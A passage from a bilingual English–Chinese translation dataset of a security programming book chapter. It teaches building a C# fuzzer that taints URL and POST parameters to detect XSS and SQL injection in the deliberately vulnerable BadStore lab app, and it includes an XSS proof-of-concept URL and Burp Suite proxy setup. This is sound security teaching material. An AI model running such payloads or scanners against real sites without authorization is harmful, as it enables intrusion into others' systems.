  zh: 如同[列表2-1](#filepos125800)中漏洞代码一样，程序员没有在将HTML渲染到屏幕之前清理或替换参数中的任何潜在不良字符➊。通过传递一个特别制作的名称参数给Web应用，我们可以将HTML渲染到屏幕上，执行JavaScript，甚至运行尝试接管计算机的Java
    applet。例如，我们可以发送一个特别制作的URL，如[列表2-8](#filepos135609)中所示。
- en: 'www.example.com/vuln.php?name=Brandon<script>alert(1)</script> Listing 2-8:
    A URL with a query string parameter that would pop up a JavaScript alert if the
    parameter were vulnerable to XSS'
  id: totrans-94
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: www.example.com/vuln.php?name=Brandon<script>alert(1)</script> 列表2-8：如果参数易受XSS攻击，则会弹出JavaScript警告的带查询字符串参数的URL
- en: The URL in [Listing 2-8](#filepos135609) could cause a JavaScript pop-up to
    appear in the browser with the number 1 if the PHP script were using the name
    parameter to build some HTML code that would eventually be rendered in the web
    browser.
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: '[列表 2-8](#filepos135609) 中的 URL 如果 PHP 脚本使用 `name` 参数构建 HTML 代码，并最终在浏览器中渲染，可能会导致
    JavaScript 弹出窗口出现，并显示数字 1。'
- en: Fuzzing GET Requests with a Mutational Fuzzer
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: 使用突变模糊测试器进行 GET 请求模糊测试
- en: Now that you know the basics of SQL injection and XSS vulnerabilities, let’s
    implement a quick fuzzer to find potential SQL injection or XSS vulnerabilities
    in query string parameters. Query string parameters are the parameters in a URL
    after the ? sign, in key = value format. We’ll focus on the HTTP parameters in
    a GET request, but first we’ll break up a URL so we can loop through any HTTP
    query string parameters, as shown in [Listing 2-9](#filepos137363).
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 现在你已经了解了 SQL 注入和 XSS 漏洞的基础知识，让我们实现一个快速的模糊测试器，用于查找查询字符串参数中的潜在 SQL 注入或 XSS 漏洞。查询字符串参数是
    URL 中问号 (?) 后面的部分，采用 key = value 格式。我们将重点关注 GET 请求中的 HTTP 参数，但首先，我们将拆分一个 URL，以便可以遍历任何
    HTTP 查询字符串参数，如 [列表 2-9](#filepos137363) 所示。
- en: public static void Main(string[] args)
  id: totrans-98
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: public static void Main(string[] args)
- en: '{'
  id: totrans-99
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: ➊string url = args[0];
  id: totrans-100
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ➊string url = args[0];
- en: int index = url.➋IndexOf("?");
  id: totrans-101
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: int index = url.➋IndexOf("?");
- en: string[] parms = url.➌Remove(0, index+1).➍Split('&');
  id: totrans-102
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string[] parms = url.➌Remove(0, index+1).➍Split('&');
- en: foreach (string parm in parms)
  id: totrans-103
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: foreach (string parm in parms)
- en: Console.WriteLine(parm);
  id: totrans-104
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Console.WriteLine(parm);
- en: '}'
  id: totrans-105
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 2-9: Small  Main()  method breaking apart the query string parameters
    in a given URL'
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 2-9：分解给定 URL 中查询字符串参数的简单 `Main()` 方法
- en: In [Listing 2-9](#filepos137363), we take the first argument (args[0]) passed
    to the main fuzzing application and assume it is a URL ➊ with some fuzzable HTTP
    parameters in the query string. In order to turn the parameters into something
    we can iterate over, we remove any characters up to and including the question
    mark (?) in the URL and use IndexOf("?") ➋ to determine the index of the first
    occurrence of a question mark, which denotes that the URL has ended and that the
    query string parameters follow; these are the parameters that we can parse.
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: 在 [列表 2-9](#filepos137363) 中，我们获取传递给主模糊测试应用程序的第一个参数 (args[0])，并假设它是一个 URL ➊，该
    URL 包含一些可以模糊测试的 HTTP 参数。为了将这些参数转换为我们可以迭代的形式，我们首先删除 URL 中的问号 (?) 之前和包括问号的部分，然后使用
    `IndexOf("?")` ➋ 确定第一个问号的位置，这标志着 URL 结束，查询字符串参数紧随其后；这些是我们可以解析的参数。
- en: Calling Remove(0, index+1) ➌ returns a string that contains only our URL parameters.
    This string is then split by the '&' character ➍, which marks the beginning of
    a new parameter. Finally, we use the foreach keyword, loop over all the strings
    in the parms array, and print each parameter and its value. We’ve now isolated
    the query string parameters and their values from the URL so that we can begin
    to alter the values while making HTTP requests in order to induce errors from
    the web application.
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: 调用 `Remove(0, index+1)` ➌ 返回一个只包含 URL 参数的字符串。这个字符串随后会根据 `&` 字符 ➍ 分割开，`&` 标志着新参数的开始。最后，我们使用
    `foreach` 关键字，循环遍历 `parms` 数组中的所有字符串，并打印每个参数及其值。现在我们已经将查询字符串参数及其值从 URL 中隔离出来，以便在发出
    HTTP 请求时开始修改这些值，从而诱发 Web 应用程序错误。
- en: Tainting the Parameters and Testing for Vulnerabilities
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 污染参数并测试漏洞
- en: Now that we have separated any URL parameters that might be vulnerable, the
    next step is to taint each with a piece of data that the server will sanitize
    properly if it is not vulnerable to either XSS or SQL injection. In the case of
    XSS, our tainted data will have <xss> added, and the data to test for SQL injection
    will have a single apostrophe.
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经分离了可能存在漏洞的 URL 参数，下一步是将每个参数污染，使用服务器如果不容易受到 XSS 或 SQL 注入影响时会正常清理的数据。对于
    XSS，我们的污染数据将添加 `<xss>`，而测试 SQL 注入的数据将包含一个单引号。
- en: We can create two new URLs to test the target by replacing the known-good parameter
    values in the URLs with the tainted data for XSS and SQL injection vulnerabilities,
    as shown in [Listing 2-10](#filepos140240).
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以创建两个新的 URL，通过将已知的有效参数值替换为污染数据，来测试目标是否存在 XSS 和 SQL 注入漏洞，如 [列表 2-10](#filepos140240)
    所示。
- en: foreach (string parm in parms)
  id: totrans-112
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: foreach (string parm in parms)
- en: '{'
  id: totrans-113
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: ➊string xssUrl = url.Replace(parm, parm + "fd<xss>sa");
  id: totrans-114
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ➊string xssUrl = url.Replace(parm, parm + "fd<xss>sa");
- en: ➋string sqlUrl = url.Replace(parm, parm + "fd'sa");
  id: totrans-115
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ➋string sqlUrl = url.Replace(parm, parm + "fd'sa");
- en: ''
  id: totrans-116
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: Console.WriteLine(xssUrl);
  id: totrans-117
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Console.WriteLine(xssUrl);
- en: Console.WriteLine(sqlUrl);
  id: totrans-118
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Console.WriteLine(sqlUrl);
- en: '}'
  id: totrans-119
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 2-10: Modified  foreach  loop replacing parameters with tainted data'
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 2-10：修改后的 `foreach` 循环，用污染数据替换参数
- en: In order to test for vulnerabilities, we need to ensure that we’re creating
    URLs that our target site will understand. To do so, we first replace the old
    parameter in the URL with a tainted one, and then we print the new URLs we’ll
    be requesting. When printed to the screen, each parameter in the URL should have
    one line that includes the XSS-tainted parameter ➊ and one line containing the
    parameter with a single apostrophe ➋, as shown in [Listing 2-11](#filepos141359).
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: 为了测试漏洞，我们需要确保我们正在创建目标网站能够理解的URL。为此，我们首先将URL中的旧参数替换为受污染的参数，然后打印出我们将请求的新URL。打印到屏幕时，URL中的每个参数应该有一行包含XSS污染的参数➊，以及一行包含带单引号的参数➋，如[清单2-11](#filepos141359)所示。
- en: http://192.168.1.75/cgi-bin/badstore.cgi?searchquery=testfd<xss>sa&action=search
  id: totrans-122
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: http://192.168.1.75/cgi-bin/badstore.cgi?searchquery=testfd<xss>sa&action=search
- en: http://192.168.1.75/cgi-bin/badstore.cgi?searchquery=testfd'sa&action=search
  id: totrans-123
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: http://192.168.1.75/cgi-bin/badstore.cgi?searchquery=testfd'sa&action=search
- en: --snip--
  id: totrans-124
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: --snip--
- en: 'Listing 2-11: URLs printed with tainted HTTP parameters'
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: '清单2-11: 带污染HTTP参数的打印URL'
- en: Building the HTTP Requests
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: 构建HTTP请求
- en: Next, we programmatically build the HTTP requests using the HttpWebRequest class,
    and then we make the HTTP requests with the tainted HTTP parameters to see if
    any errors are returned (see [Listing 2-12](#filepos143491)).
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们通过编程方式使用HttpWebRequest类构建HTTP请求，然后使用受污染的HTTP参数发起请求，看看是否返回任何错误（见[清单2-12](#filepos143491)）。
- en: foreach (string parm in parms)
  id: totrans-128
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: foreach (string parm in parms)
- en: '{'
  id: totrans-129
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: string xssUrl = url.Replace(parm, parm + "fd<xss>sa");
  id: totrans-130
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string xssUrl = url.Replace(parm, parm + "fd<xss>sa");
- en: string sqlUrl = url.Replace(parm, parm + "fd'sa");
  id: totrans-131
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string sqlUrl = url.Replace(parm, parm + "fd'sa");
- en: HttpWebRequest request = (HttpWebRequest)WebRequest.➊Create(sqlUrl);
  id: totrans-132
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: HttpWebRequest request = (HttpWebRequest)WebRequest.➊Create(sqlUrl);
- en: request.➋Method = "GET";
  id: totrans-133
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: request.➋Method = "GET";
- en: ''
  id: totrans-134
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: string sqlresp = string.Empty;
  id: totrans-135
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string sqlresp = string.Empty;
- en: using (StreamReader rdr = new
  id: totrans-136
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: using (StreamReader rdr = new
- en: StreamReader(request.GetResponse().GetResponseStream()))
  id: totrans-137
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: StreamReader(request.GetResponse().GetResponseStream()))
- en: sqlresp = rdr.➌ReadToEnd();
  id: totrans-138
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: sqlresp = rdr.➌ReadToEnd();
- en: ''
  id: totrans-139
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: request = (HttpWebRequest)WebRequest.Create(xssUrl);
  id: totrans-140
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: request = (HttpWebRequest)WebRequest.Create(xssUrl);
- en: request.Method = "GET";
  id: totrans-141
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: request.Method = "GET";
- en: string xssresp = string.Empty;
  id: totrans-142
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string xssresp = string.Empty;
- en: ''
  id: totrans-143
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: using (StreamReader rdr = new
  id: totrans-144
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: using (StreamReader rdr = new
- en: StreamReader(request.GetResponse().GetResponseStream()))
  id: totrans-145
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: StreamReader(request.GetResponse().GetResponseStream()))
- en: xssresp = rdr.ReadToEnd();
  id: totrans-146
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: xssresp = rdr.ReadToEnd();
- en: ''
  id: totrans-147
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: if (xssresp.Contains("<xss>"))
  id: totrans-148
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if (xssresp.Contains("<xss>"))
- en: 'Console.WriteLine("Possible XSS point found in parameter: " + parm);'
  id: totrans-149
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Console.WriteLine("在参数中发现可能的XSS点: " + parm);'
- en: ''
  id: totrans-150
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: if (sqlresp.Contains("error in your SQL syntax"))
  id: totrans-151
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if (sqlresp.Contains("SQL语法错误"))
- en: 'Console.WriteLine("SQL injection point found in parameter: " + parm);'
  id: totrans-152
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Console.WriteLine("在参数中发现SQL注入点: " + parm);'
- en: ''
  id: totrans-153
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '}'
  id: totrans-154
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 2-12: Full  foreach  loop testing the given URL for XSS and SQL injection'
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: '清单2-12: 完整的foreach循环，测试给定的URL是否存在XSS和SQL注入'
- en: In [Listing 2-12](#filepos143491), we use the static Create() method ➊ from
    the WebRequest class in order to make an HTTP request, passing the URL in the
    sqlUrl variable tainted with a single apostrophe as an argument, and we cast the
    resulting instantiated WebRequest returned to an HttpWebRequest. (Static methods
    are available without instantiating the parent class.) The static Create() method
    uses a factory pattern to create new objects based on the URL passed, which is
    why we need to cast the object returned to an HttpWebRequest object. If we passed
    a URL prefaced with ftp:// or file://, for instance, then the type of object returned
    by the Create() method would be a different class (FtpWebRequest or FileWebRequest,
    respectively). We then set the Method property of the HttpWebRequest to GET (so
    we make a GET request) ➋ and save the response to the request in the resp string
    using the StreamReader class and the ReadToEnd() method ➌. If the response either
    contains the unsanitized XSS payload or throws an error regarding SQL syntax,
    we know we may have found a vulnerability.
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: 在[清单2-12](#filepos143491)中，我们使用WebRequest类的静态Create()方法➊来发起HTTP请求，将受单引号污染的sqlUrl变量中的URL作为参数传递，并将返回的实例化WebRequest对象强制转换为HttpWebRequest。（静态方法不需要实例化父类即可使用。）Create()方法采用工厂模式，根据传入的URL创建新的对象，这就是我们需要将返回的对象强制转换为HttpWebRequest对象的原因。例如，如果我们传入的URL以ftp://或file://开头，那么Create()方法返回的对象类型将是不同的类（分别是FtpWebRequest或FileWebRequest）。然后，我们将HttpWebRequest的Method属性设置为GET（这样我们就发起一个GET请求）➋，并使用StreamReader类和ReadToEnd()方法将响应保存到请求的响应中，保存在resp字符串中➌。如果响应包含未经清洗的XSS有效负载，或者抛出关于SQL语法的错误，我们就知道可能发现了一个漏洞。
- en: NOTE
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: 注意
- en: Notice that we’re using the using keyword in a new way here. Prior to this,
    we used using to import classes within a namespace (such as System.Net) into the
    fuzzer. Essentially, instantiated objects (objects created with the new keyword)
    can be used in the context of a using block in this way when the class implements
    the IDisposable interface (which requires a class to implement a Dispose() method).
    When the scope of the using block ends, the Dispose() method on the object is
    called automatically. This is a very useful way to manage the scope of a resource
    that can lead to resource leaks, such as network resources or file descriptors.
  id: totrans-158
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 注意，我们在这里以新的方式使用了using关键字。在此之前，我们使用using来导入命名空间中的类（例如System.Net）到模糊测试工具中。基本上，当类实现了IDisposable接口（该接口要求类实现Dispose()方法）时，通过using块使用实例化的对象（使用new关键字创建的对象）。当using块的作用域结束时，对象的Dispose()方法会自动被调用。这是一种非常有用的方法来管理可能导致资源泄漏的资源的作用域，例如网络资源或文件描述符。
- en: Testing the Fuzzing Code
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: 测试模糊测试代码
- en: Let’s test our code with the search field on the BadStore front page. After
    opening the BadStore application in your web browser, click the Home menu item
    on the left side of the page and then perform a quick search from the search box
    in the upper-left corner. You should see a URL in your browser similar to the
    one shown in [Listing 2-13](#filepos147136).
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们使用BadStore首页上的搜索字段来测试我们的代码。在Web浏览器中打开BadStore应用后，点击页面左侧的“主页”菜单项，然后在左上角的搜索框中执行快速搜索。您应该会在浏览器中看到类似于[清单2-13](#filepos147136)中显示的URL。
- en: 'http://192.168.1.75/cgi-bin/badstore.cgi?searchquery=test&action=search Listing
    2-13: Sample URL to the BadStore search page'
  id: totrans-161
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: http://192.168.1.75/cgi-bin/badstore.cgi?searchquery=test&action=search 清单2-13：指向BadStore搜索页面的示例URL
- en: Pass the URL in [Listing 2-13](#filepos147136) (replacing the IP address with
    the IP address of the BadStore instance on your network) to the program as an
    argument on the command line, as shown in [Listing 2-14](#filepos147971), and
    the fuzzing should begin.
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: 将[清单2-13](#filepos147136)中的URL（将IP地址替换为您网络中BadStore实例的IP地址）作为参数传递给程序，如[清单2-14](#filepos147971)所示，模糊测试应开始。
- en: $ ./fuzzer.exe "http://192.168.1.75/cgi-bin/badstore.cgi?searchquery=test&action=search"
  id: totrans-163
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $ ./fuzzer.exe "http://192.168.1.75/cgi-bin/badstore.cgi?searchquery=test&action=search"
- en: 'SQL injection point found in parameter: searchquery=test'
  id: totrans-164
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 在参数中发现SQL注入点：searchquery=test
- en: 'Possible XSS point found in parameter: searchquery=test'
  id: totrans-165
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 在参数中发现可能的XSS点：searchquery=test
- en: $
  id: totrans-166
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $
- en: 'Listing 2-14: Running the XSS and SQL injection fuzzer'
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: 清单2-14：运行XSS和SQL注入模糊测试工具
- en: Running our fuzzer should find both a SQL injection and XSS vulnerability in
    BadStore, with output similar to that of [Listing 2-14](#filepos147971).
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 运行我们的模糊测试工具应该能在BadStore中发现SQL注入和XSS漏洞，输出内容类似于[清单2-14](#filepos147971)。
- en: Fuzzing POST Requests
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: 对POST请求进行模糊测试
- en: In this section, we’ll use BadStore to fuzz the parameters of a POST request
    (a request used to submit data to a web resource for processing) saved to the
    local hard drive. We’ll capture a POST request using Burp Suite—an easy-to-use
    HTTP proxy built for security researchers and pen testers that sits between your
    browser and the HTTP server so that you can see the data sent back and forth.
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们将使用BadStore对保存在本地硬盘上的POST请求（用于向Web资源提交数据进行处理的请求）参数进行模糊测试。我们将使用Burp Suite捕获POST请求——这是一款为安全研究人员和渗透测试人员设计的易于使用的HTTP代理，位于浏览器和HTTP服务器之间，您可以看到数据的来回传输。
- en: Download and install Burp Suite now from [http://www.portswigger.net/](http://www.portswigger.net/).
    (Burp Suite is a Java archive or JAR file that can be saved to a thumb drive or
    other portable media.) Once Burp Suite is downloaded, start it using Java with
    the commands shown in [Listing 2-15](#filepos149459).
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: 现在从[http://www.portswigger.net/](http://www.portswigger.net/)下载并安装Burp Suite。（Burp
    Suite是一个Java归档文件（JAR文件），可以保存到U盘或其他可移动介质。）下载Burp Suite后，使用Java通过[清单2-15](#filepos149459)中所示的命令启动它。
- en: $ cd ~/Downloads/
  id: totrans-172
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $ cd ~/Downloads/
- en: '$ java -jar burpsuite*.jar  Listing 2-15: Running Burp Suite from the command
    line'
  id: totrans-173
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $ java -jar burpsuite*.jar  清单2-15：从命令行运行Burp Suite
- en: 'Once started, the Burp Suite proxy should be listening on port 8080\. Set Firefox
    traffic to use the Burp Suite proxy as follows:'
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: 启动后，Burp Suite代理应监听8080端口。将Firefox的流量设置为使用Burp Suite代理，如下所示：
- en: From within Firefox, choose Edit ▸ Preferences. The Advanced dialog should appear.
  id: totrans-175
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在Firefox中，选择“编辑”▸“首选项”。高级对话框应出现。
- en: Choose the Network tab, as shown in [Figure 2-3](#filepos150385).
  id: totrans-176
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择“网络”标签，如[图2-3](#filepos150385)所示。
- en: '![](images/00024.jpg)'
  id: totrans-177
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![](images/00024.jpg)'
- en: 'Figure 2-3: The Network tab within Firefox preferences'
  id: totrans-178
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 2-3：Firefox 偏好设置中的网络选项卡
- en: Click Settings... to open the Connection Settings dialog, as shown in [Figure
    2-4](#filepos150831).
  id: totrans-179
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 单击“设置...”以打开连接设置对话框，如[图 2-4](#filepos150831)所示。
- en: '![](images/00025.jpg)'
  id: totrans-180
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![](images/00025.jpg)'
- en: 'Figure 2-4: The Connection Settings dialog'
  id: totrans-181
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 2-4：连接设置对话框
- en: Select Manual proxy configuration and enter 127.0.0.1 into the HTTP Proxy field
    and 8080 into the Port field. Click OK and then close the Connection Settings
    dialog.
  id: totrans-182
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择手动代理配置，并在 HTTP 代理字段中输入 127.0.0.1，在端口字段中输入 8080。点击“确定”，然后关闭连接设置对话框。
- en: Now all requests sent through Firefox should be directed through Burp Suite
    first. (To test this, go to [http://google.com/](http://google.com/); you should
    see the request in Burp Suite’s request pane, as shown in [Figure 2-5](#filepos151522).)
    ![](images/00026.jpg)
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，通过 Firefox 发送的所有请求应该首先通过 Burp Suite。（要测试这一点，访问 [http://google.com/](http://google.com/);
    你应该能在 Burp Suite 的请求窗格中看到该请求，如[图 2-5](#filepos151522)所示。） ![](images/00026.jpg)
- en: 'Figure 2-5: Burp Suite actively capturing a request for google.com from Firefox'
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: 图 2-5：Burp Suite 正在主动捕获来自 Firefox 的请求到 google.com
- en: Clicking the Forward button within Burp Suite should forward the request (to
    Google in this case) and return the response to Firefox.
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: 在 Burp Suite 中点击“转发”按钮应该会将请求转发（此处是转发到 Google）并将响应返回给 Firefox。
- en: Writing a POST Request Fuzzer
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: 编写 POST 请求模糊测试器
- en: We’ll write and test our POST request fuzzer against BadStore’s “What’s New”
    page (see [Figure 2-6](#filepos152414)). Navigate to this page in Firefox and
    click the What’s New menu item on the left.
  id: totrans-187
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将编写并测试我们的 POST 请求模糊测试器，针对 BadStore 的“最新商品”页面（见[图 2-6](#filepos152414)）。在 Firefox
    中访问该页面，并点击左侧的“最新商品”菜单项。
- en: '![](images/00028.jpg)'
  id: totrans-188
  prefs: []
  type: TYPE_IMG
  zh: '![](images/00028.jpg)'
- en: 'Figure 2-6: The “What’s New” items page of the BadStore web application'
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
  zh: 图 2-6：BadStore Web 应用程序的“最新商品”页面
- en: A button at the bottom of the page is used to add checked items to your shopping
    cart. With Burp Suite sitting between your browser and the BadStore server, select
    a few items using the checkboxes on the right side of the page and then click
    Submit to initiate the HTTP request to add the items to your cart. Capturing the
    submit request within Burp Suite should yield a request like [Listing 2-16](#filepos153948).
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: 页面底部有一个按钮，用于将选中的商品添加到购物车。通过让 Burp Suite 位于浏览器和 BadStore 服务器之间，选择页面右侧的几个商品，并单击“提交”以发起添加商品到购物车的HTTP请求。在
    Burp Suite 中捕获提交请求后，应该会得到像[清单 2-16](#filepos153948)这样的请求。
- en: POST /cgi-bin/badstore.cgi?action=cartadd HTTP/1.1
  id: totrans-191
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: POST /cgi-bin/badstore.cgi?action=cartadd HTTP/1.1
- en: 'Host: 192.168.1.75'
  id: totrans-192
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Host: 192.168.1.75'
- en: 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:20.0) Gecko/20100101
    Firefox/20.0'
  id: totrans-193
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:20.0) Gecko/20100101
    Firefox/20.0'
- en: 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
  id: totrans-194
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
- en: 'Accept-Language: en-US,en;q=0.5'
  id: totrans-195
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Accept-Language: en-US,en;q=0.5'
- en: 'Accept-Encoding: gzip, deflate'
  id: totrans-196
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Accept-Encoding: gzip, deflate'
- en: 'Referer: https://192.168.1.75/cgi-bin/badstore.cgi?action=whatsnew'
  id: totrans-197
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Referer: https://192.168.1.75/cgi-bin/badstore.cgi?action=whatsnew'
- en: 'Connection: keep-alive'
  id: totrans-198
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Connection: keep-alive'
- en: 'Content-Type: application/x-www-form-urlencoded'
  id: totrans-199
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Content-Type: application/x-www-form-urlencoded'
- en: 'Content-Length: 63'
  id: totrans-200
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Content-Length: 63'
- en: ''
  id: totrans-201
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 'cartitem=1000&cartitem=1003&Add+Items+to+Cart=Add+Items+to+Cart Listing 2-16:
    HTTP POST request from Burp Suite'
  id: totrans-202
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: cartitem=1000&cartitem=1003&Add+Items+to+Cart=Add+Items+to+Cart 清单 2-16：来自Burp
    Suite的HTTP POST请求
- en: The request shown in [Listing 2-16](#filepos153948) is a typical POST request
    with URL-encoded parameters (a set of special characters, some of which are whitespace
    such as spaces and newlines). Note that this request uses plus signs (+) instead
    of spaces. Save this request to a text file. We’ll use it later to systematically
    fuzz the parameters being sent in the HTTP POST request.
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: 如[清单 2-16](#filepos153948)所示的请求是一个典型的带有URL编码参数的POST请求（这些参数是一组特殊字符，其中有些是空白字符，例如空格和换行符）。请注意，此请求使用加号（+）代替空格。将此请求保存到文本文件中。稍后我们将使用它来系统地模糊测试在HTTP
    POST请求中发送的参数。
- en: NOTE
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 注意
- en: The parameters in an HTTP POST request are included in the last line of the
    request, which defines the data being posted in key/value form. (Some POST requests
    post multipart forms or other exotic types of data, but the general principle
    remains the same.)
  id: totrans-205
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: HTTP POST 请求中的参数包含在请求的最后一行中，该行定义了以键/值形式发送的数据。（一些 POST 请求会发送多部分表单或其他特殊类型的数据，但基本原理是相同的。）
- en: Notice in this request that we are adding the items with an ID of 1000 and 1003
    to the cart. Now look at the Firefox window, and you should notice that these
    numbers correspond to the ItemNum column. We are posting a parameter along with
    these IDs, essentially telling the application what to do with the data we’re
    sending (namely, add the items to the cart). As you can see, the only parameters
    that might be susceptible to SQL injection are the two cartitem parameters, because
    these are the parameters that the server will interpret.
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
  zh: 注意，在此请求中，我们正在将 ID 为 1000 和 1003 的项添加到购物车中。现在查看 Firefox 窗口，你应该会注意到这些数字对应于 ItemNum
    列。我们正在提交一个参数，并附带这些 ID，实质上是在告诉应用程序如何处理我们发送的数据（即将这些项添加到购物车）。如你所见，唯一可能容易受到 SQL 注入攻击的参数是这两个
